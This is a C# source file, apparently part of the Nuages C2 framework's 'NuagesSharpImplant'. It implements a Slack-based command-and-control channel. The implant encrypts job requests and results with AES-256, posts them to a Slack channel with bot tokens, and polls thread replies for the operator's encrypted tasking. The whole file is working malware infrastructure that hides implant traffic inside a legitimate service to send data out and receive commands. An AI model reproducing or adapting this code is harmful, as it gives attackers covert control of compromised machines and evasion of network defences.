using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Net.Http;
using Newtonsoft.Json;
using System.CodeDom;
using System.Linq;

namespace NuagesSharpImplant
{
    

    public class SLACKAES256Connection : NuagesC2Connection
    {

        private string handler = "PyAES256";

        private string slackAppToken;

        private string slackToken;

        private HttpClient client;

        private string channelId;

        private AESHelper aes;

        public int refreshrate;

        public int buffersize;

        public SLACKAES256Connection(string password, string channelId, string slackToken, string slackAppToken, int buffersize, int refreshrate)
        {
            this.aes = new AESHelper(password);

            this.refreshrate = refreshrate;

            this.buffersize = buffersize;

            this.slackAppToken = slackAppToken;

            this.slackToken = slackToken;

            this.channelId = channelId;
            
            this.client = new HttpClient();

            this.client.BaseAddress = new Uri("https://slack.com/api/");
        }

        public string getConnectionString()
        {
            return "Slack";
        }

        public string getHandler()
        {
            return this.handler;
        }

        public void setRefreshRate(int refreshrate)
        {

            this.refreshrate = refreshrate;

        }

        public void setBufferSize(int buffersize)
        {

            this.buffersize = buffersize;

        }

        public int getBufferSize()
        {
            return this.buffersize;
        }

        public int getRefreshRate()
        {
            return this.refreshrate;
        }

        string sendSlackMessage(string message, int tries = 0)
        {
            JObject body = new JObject(
                new JProperty("channel", this.channelId),
                new JProperty("text", message),
                new JProperty("as_user", true)
            );
            WebRequest request = WebRequest.Create("https://slack.com/api/chat.postMessage");
            request.Headers.Add("Authorization", "Bearer " + this.slackToken);
            request.ContentType = "application/json";
            request.Method = "POST";
            byte[] byteArray = Encoding.UTF8.GetBytes(body.ToString(Formatting.None));
            request.ContentLength = byteArray.Length;
            Stream dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);
            dataStream.Close();
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if ((int)response.StatusCode == 429 && tries < 3)
            {
                System.Threading.Thread.Sleep(3000 * (tries + 1));
                return sendSlackMessage(message, tries + 1);
            }
            dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            string responseFromServer = reader.ReadToEnd();
            JObject jResponse = JObject.Parse(responseFromServer);
            if ((int)response.StatusCode != 200 || (bool)jResponse["ok"] != true)
            {
                throw new Exception("Couldnt send SLACK message");
            }
            string ts = jResponse["ts"].ToString();
            return ts;
        }

        string getSlackResponse(string ts, int tries = 0)
        {
            if (tries == 4) {
                throw new Exception("No slack response found");
            }
            string url = "https://slack.com/api/conversations.replies?";
            url += "token=" + this.slackAppToken + "&channel=" + this.channelId + "&ts=" + ts;
            WebRequest request = WebRequest.Create(url);
            request.ContentType = "application/json";
            request.Headers.Add("Authorization", "Bearer " + this.slackToken);
            request.Method = "GET";
            Stream dataStream;
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if ((int)response.StatusCode == 429)
            {
                System.Threading.Thread.Sleep(3000 * (tries + 1));
                return getSlackResponse(ts, tries + 1);
            }
            dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);
            string responseFromServer = reader.ReadToEnd();
            JObject jResponse = JObject.Parse(responseFromServer);
            JArray messages = (JArray)(jResponse["messages"]);
            if (messages.Count < 2) {
                System.Threading.Thread.Sleep(1000 * (tries + 1));
                return getSlackResponse(ts, tries + 1);
            }
            return messages[1]["text"].ToString();
        }




        public string POST(string url, string jsonContent)
        {

            JObject body = new JObject(
                new JProperty("url", url),
                new JProperty("body", Convert.ToBase64String(this.aes.EncryptString(jsonContent)))
            );
            string ts = sendSlackMessage(body.ToString());
            if (url == "jobresult") {
                return "";
            }
            System.Threading.Thread.Sleep(1000);
            string nResponse = this.getSlackResponse(ts);
            return this.aes.DecryptString(Convert.FromBase64String(nResponse));
        }
        class AESHelper
        {
            byte[] key;

            static byte[] Sha256(string rawData)
            {
                using (SHA256 sha256Hash = SHA256.Create())
                {
                    return sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

                }
            }

            public AESHelper(string password)
            {

                this.key = Sha256(password);

            }

            public byte[] EncryptString(string message)
            {
                var aes = new AesCryptoServiceProvider();
                aes.Mode = CipherMode.CBC;
                aes.KeySize = 256;
                aes.Padding = PaddingMode.PKCS7;
                byte[] iv = aes.IV;
                using (var memStream = new System.IO.MemoryStream())
                {
                    memStream.Write(iv, 0, iv.Length);
                    using (var cryptStream = new CryptoStream(memStream, aes.CreateEncryptor(this.key, aes.IV), CryptoStreamMode.Write))
                    {
                        using (var writer = new System.IO.StreamWriter(cryptStream))
                        {
                            writer.Write(message);
                        }
                    }
                    var buf = memStream.ToArray();
                    return buf;
                }
            }

            public string DecryptString(byte[] bytes)
            {
                //var bytes = Convert.FromBase64String(encryptedValue);
                var aes = new AesCryptoServiceProvider();
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.KeySize = 256;
                using (var memStream = new System.IO.MemoryStream(bytes))
                {
                    var iv = new byte[16];
                    memStream.Read(iv, 0, 16);
                    using (var cryptStream = new CryptoStream(memStream, aes.CreateDecryptor(this.key, iv), CryptoStreamMode.Read))
                    {
                        using (var reader = new System.IO.StreamReader(cryptStream))
                        {
                            return reader.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
}
